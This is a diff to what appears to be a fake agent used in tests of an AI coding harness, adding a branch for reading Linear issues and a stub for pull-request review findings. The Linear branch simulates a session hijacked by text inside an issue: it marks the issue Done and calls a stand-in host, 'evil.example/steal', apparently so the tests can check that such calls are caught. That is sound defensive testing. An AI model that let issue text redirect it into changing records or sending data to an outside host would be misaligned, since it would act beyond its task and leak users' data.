@@ -223,6 +223,14 @@ function main(): void {
       tool('mcp__Atlassian__addCommentToJiraIssue', { issueIdOrKey: issue[1], commentBody: 'hi' });
       return reply(`Read it.\n\`\`\`json\n${JSON.stringify({ title: `${issue[1]} Cap the max bet`, url: `https://acme.atlassian.net/browse/${issue[1]}`, description: 'Players can bet too much.\n\n## Acceptance criteria\n- bets above the cap are rejected', acceptanceCriteria: [], links: [], context: 'PM: per operator, not global' })}\n\`\`\``, uuid);
     }
+    const linear = prompt.match(/^Read the Linear issue (\S+) \((\S+)\)/);
+    if (linear) {
+      tool('mcp__linear__get_issue', { id: linear[1] });
+      // What a session steered by the issue's text would try: change it, or carry it to another host.
+      tool('mcp__linear__update_issue', { id: linear[1], state: 'Done' });
+      tool('mcp__linear__get_document', { url: 'https://evil.example/steal' });
+      return reply(`Read it.\n\`\`\`json\n${JSON.stringify({ title: `${linear[1]} Dark mode`, url: linear[2], description: 'Add a dark theme.\n\n## Acceptance criteria\n- follows the OS setting', acceptanceCriteria: [], links: [], context: '' })}\n\`\`\``, uuid);
+    }
     const comment = prompt.match(/^Add one comment to the Jira issue (\S+)/);
     if (comment) {
       const body = (prompt.match(/-----BEGIN COMMENT-----\n([\s\S]*)\n-----END COMMENT-----/) || [])[1] || '';
@@ -277,6 +285,14 @@ function main(): void {
       case 'security':
       case 'appsec-reviewer':
       case 'reviewer': {
+        // FAKE_PR_FINDINGS: the findings of a pull request's review, as JSON; its prompt is kept to read.
+        if (process.env.FAKE_PR_FINDINGS) {
+          if (state) fs.writeFileSync(path.join(state, `prompt-${role}.txt`), prompt);
+          // The reviewer finds them; a second reviewer at once finds nothing.
+          const findings = role === 'reviewer' ? (JSON.parse(process.env.FAKE_PR_FINDINGS) as { severity: string }[]) : [];
+          const blocking = findings.some((f) => f.severity === 'blocker' || f.severity === 'major');
+          return reply(`Reviewed the pull request.\n\`\`\`json\n${JSON.stringify({ status: blocking ? 'changes_requested' : 'approved', summary: `${role} read it`, findings })}\n\`\`\``, uuid);
+        }
         const marker = path.join(state!, 'reviewed-once');
         if (process.env.FAKE_REVIEW === 'fail-once' && !fs.existsSync(marker)) {
           fs.writeFileSync(marker, '1');
